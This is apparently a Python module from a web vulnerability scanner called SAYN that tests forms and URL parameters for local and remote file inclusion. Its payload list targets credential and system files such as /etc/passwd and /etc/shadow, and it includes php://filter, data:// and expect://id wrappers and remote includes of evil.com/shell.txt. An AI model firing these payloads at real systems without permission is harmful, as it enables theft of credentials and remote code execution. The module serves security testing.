"""
File Inclusion Scanner Module for SAYN
Detects Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities
"""

import re
import asyncio
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging

class FileInclusionScanner:
    """Advanced File Inclusion vulnerability scanner"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = logging.getLogger('SAYN.file_inclusion_scanner')
        self.payloads = self._load_file_inclusion_payloads()
        
    def _load_file_inclusion_payloads(self) -> Dict[str, List[str]]:
        """Load file inclusion test payloads"""
        return {
            'lfi_payloads': [
                '../etc/passwd',
                '../../etc/passwd',
                '../../../etc/passwd',
                '../../../../etc/passwd',
                '../../../../../etc/passwd',
                '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd',
                '../../../../../../../../etc/passwd',
                '../etc/shadow',
                '../../etc/shadow',
                '../../../etc/shadow',
                '../etc/hosts',
                '../../etc/hosts',
                '../../../etc/hosts',
                '../windows/system32/drivers/etc/hosts',
                '../../windows/system32/drivers/etc/hosts',
                '../../../windows/system32/drivers/etc/hosts',
                '../boot.ini',
                '../../boot.ini',
                '../../../boot.ini',
                '../windows/win.ini',
                '../../windows/win.ini',
                '../../../windows/win.ini',
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/proc/version',
                '/proc/self/environ',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\boot.ini',
                'C:\\windows\\win.ini',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..\\..\\..\\boot.ini',
                '..\\..\\..\\windows\\win.ini',
                'php://filter/read=convert.base64-encode/resource=../../../etc/passwd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',
                'file:///etc/passwd',
                'file:///c:/windows/win.ini'
            ],
            'rfi_payloads': [
                'http://evil.com/shell.txt',
                'https://evil.com/shell.txt',
                'ftp://evil.com/shell.txt',
                'http://127.0.0.1/shell.txt',
                'https://127.0.0.1/shell.txt',
                'http://localhost/shell.txt',
                'https://localhost/shell.txt',
                'http://google.com/robots.txt',
                'https://google.com/robots.txt',
                'http://httpbin.org/get',
                'https://httpbin.org/get'
            ]
        }
    
    async def scan(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        """Main file inclusion scanning method"""
        self.logger.info(f"Starting file inclusion scan for {target}")
        
        vulnerabilities = []
        scan_results = {
            'module': 'file_inclusion_scanner',
            'target': target,
            'vulnerabilities': vulnerabilities,
            'scan_completed': False,
            'total_tests': 0,
            'tests_completed': 0
        }
        
        try:
            scanner_engine = options.get('scanner_engine')
            if not scanner_engine:
                raise ValueError("Scanner engine not provided in options")
            
            forms = await self._extract_forms(scanner_engine, target)
            parameters = await self._extract_parameters(scanner_engine, target)
            
            total_payloads = sum(len(payloads) for payloads in self.payloads.values())
            scan_results['total_tests'] = (len(forms) + len(parameters)) * total_payloads
            
            # Test forms for file inclusion
            for form in forms:
                form_vulns = await self._test_form_file_inclusion(scanner_engine, target, form)
                vulnerabilities.extend(form_vulns)
                scan_results['tests_completed'] += total_payloads
                
            # Test URL parameters for file inclusion
            for param in parameters:
                param_vulns = await self._test_parameter_file_inclusion(scanner_engine, target, param)
                vulnerabilities.extend(param_vulns)
                scan_results['tests_completed'] += total_payloads
            
            scan_results['vulnerabilities'] = vulnerabilities
            scan_results['scan_completed'] = True
            
            self.logger.info(f"File inclusion scan completed. Found {len(vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            self.logger.error(f"Error during file inclusion scan: {str(e)}")
            scan_results['error'] = str(e)
            
        return scan_results
    
    async def _extract_forms(self, scanner_engine, target: str) -> List[Dict[str, Any]]:
        """Extract forms from the target page"""
        forms = []
        
        try:
            response = await scanner_engine.make_request(target)
            if response.get('error'):
                return forms
                
            content = response.get('content', '')
            
            form_pattern = r'<form[^>]*>(.*?)</form>'
            form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)
            
            for form_match in form_matches:
                form_info = {
                    'action': self._extract_form_action(form_match),
                    'method': self._extract_form_method(form_match),
                    'inputs': self._extract_form_inputs(form_match)
                }
                forms.append(form_info)
                
        except Exception as e:
            self.logger.error(f"Error extracting forms: {str(e)}")
            
        return forms
    
    def _extract_form_action(self, form_html: str) -> str:
        """Extract form action URL"""
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        return action_match.group(1) if action_match else ''
    
    def _extract_form_method(self, form_html: str) -> str:
        """Extract form method"""
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        return method_match.group(1).upper() if method_match else 'GET'
    
    def _extract_form_inputs(self, form_html: str) -> List[Dict[str, str]]:
        """Extract form input fields"""
        inputs = []
        
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for input_match in input_matches:
            input_info = {
                'name': self._extract_attribute(input_match, 'name'),
                'type': self._extract_attribute(input_match, 'type', 'text'),
                'value': self._extract_attribute(input_match, 'value', '')
            }
            if input_info['name']:
                inputs.append(input_info)
                
        return inputs
    
    def _extract_attribute(self, html: str, attr: str, default: str = '') -> str:
        """Extract attribute value from HTML element"""
        pattern = rf'{attr}=["\']([^"\']*)["\']'
        match = re.search(pattern, html, re.IGNORECASE)
        return match.group(1) if match else default
    
    async def _extract_parameters(self, scanner_engine, target: str) -> List[str]:
        """Extract URL parameters for testing"""
        parameters = []
        
        try:
            parsed_url = urlparse(target)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                parameters.extend(params.keys())
                
        except Exception as e:
            self.logger.error(f"Error extracting parameters: {str(e)}")
            
        return parameters
    
    async def _test_form_file_inclusion(self, scanner_engine, target: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for file inclusion vulnerabilities"""
        vulnerabilities = []
        
        try:
            form_url = urljoin(target, form['action']) if form['action'] else target
            method = form['method']
            
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'textarea', 'search', 'url', 'tel', 'file']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = await self._test_single_file_inclusion(
                                scanner_engine, form_url, method, 
                                input_field['name'], payload, payload_type, 'form_input'
                            )
                            if vuln:
                                vulnerabilities.append(vuln)
                                
        except Exception as e:
            self.logger.error(f"Error testing form file inclusion: {str(e)}")
            
        return vulnerabilities
    
    async def _test_parameter_file_inclusion(self, scanner_engine, target: str, parameter: str) -> List[Dict[str, Any]]:
        """Test URL parameters for file inclusion vulnerabilities"""
        vulnerabilities = []
        
        try:
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    vuln = await self._test_single_file_inclusion(
                        scanner_engine, target, 'GET', 
                        parameter, payload, payload_type, 'url_parameter'
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                        
        except Exception as e:
            self.logger.error(f"Error testing parameter file inclusion: {str(e)}")
            
        return vulnerabilities
    
    async def _test_single_file_inclusion(self, scanner_engine, url: str, method: str, 
                                        param_name: str, payload: str, payload_type: str, source: str) -> Optional[Dict[str, Any]]:
        """Test a single file inclusion payload"""
        try:
            if method == 'GET':
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                response = await scanner_engine.make_request(test_url)
            else:
                data = {param_name: payload}
                response = await scanner_engine.make_request(url, method='POST', data=data)
            
            if response.get('error'):
                return None
                
            content = response.get('content', '')
            
            if self._detect_file_inclusion(payload, content, payload_type):
                return {
                    'type': 'file_inclusion',
                    'severity': self._determine_severity(payload_type),
                    'title': f'{payload_type.upper().replace("_", " ")} Vulnerability',
                    'description': f'File inclusion vulnerability found in {source} "{param_name}". '
                                 f'The payload "{payload}" indicates {payload_type} vulnerability.',
                    'location': f'{url} (Parameter: {param_name})',
                    'recommendation': 'Implement proper input validation and use whitelisting for file operations. '
                                    'Avoid using user input directly in file operations.',
                    'payload': payload,
                    'source': source,
                    'parameter': param_name,
                    'payload_type': payload_type,
                    'evidence': self._extract_evidence(payload, content)
                }
                
        except Exception as e:
            self.logger.error(f"Error testing file inclusion payload: {str(e)}")
            
        return None
    
    def _detect_file_inclusion(self, payload: str, content: str, payload_type: str) -> bool:
        """Detect file inclusion vulnerability indicators"""
        if payload_type == 'lfi_payloads':
            # Look for common Linux/Unix file indicators
            lfi_indicators = [
                'root:x:0:0:',  # /etc/passwd
                'daemon:x:1:1:',  # /etc/passwd
                'bin:x:2:2:',  # /etc/passwd
                'root:$',  # /etc/shadow
                'daemon:*:',  # /etc/shadow
                '127.0.0.1',  # hosts file
                'localhost',  # hosts file
                '[boot loader]',  # boot.ini
                'timeout=',  # boot.ini
                '[fonts]',  # win.ini
                'for 16-bit app support',  # win.ini
                'Linux version',  # /proc/version
                'gcc version',  # /proc/version
                'PATH=',  # /proc/self/environ
                'HOME=',  # /proc/self/environ
            ]
            
            for indicator in lfi_indicators:
                if indicator in content:
                    return True
                    
        elif payload_type == 'rfi_payloads':
            # Look for remote file inclusion indicators
            rfi_indicators = [
                'User-Agent:',  # HTTP headers from remote request
                'Accept:',  # HTTP headers from remote request
                'robots.txt',  # Common test file
                '"url"',  # JSON response from httpbin
                '"headers"',  # JSON response from httpbin
                '"origin"',  # JSON response from httpbin
            ]
            
            for indicator in rfi_indicators:
                if indicator in content:
                    return True
        
        return False
    
    def _determine_severity(self, payload_type: str) -> str:
        """Determine severity based on payload type"""
        if payload_type == 'rfi_payloads':
            return 'critical'  # RFI is more dangerous
        else:
            return 'high'  # LFI is still high risk
    
    def _extract_evidence(self, payload: str, content: str) -> str:
        """Extract evidence of file inclusion"""
        lines = content.split('\n')
        evidence_lines = []
        
        for i, line in enumerate(lines):
            if any(indicator in line.lower() for indicator in ['root:', 'daemon:', '127.0.0.1', 'localhost', 'linux version', 'user-agent:', 'robots']):
                start = max(0, i - 1)
                end = min(len(lines), i + 2)
                evidence_lines.extend(lines[start:end])
                break
        
        if evidence_lines:
            return '\n'.join(evidence_lines)
        else:
            return content[:500] + '...' if len(content) > 500 else content
